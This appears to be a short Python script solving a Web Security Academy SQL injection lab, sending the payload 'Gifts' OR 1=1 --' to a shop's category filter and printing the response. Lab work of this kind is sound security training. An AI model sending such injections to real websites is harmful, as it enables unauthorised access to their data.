import requests

site = '0aa600c404e1164780ec49f6001c0024.web-security-academy.net'
def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.text)

s = requests.Session()
try_category("""Gifts' OR 1=1 --""")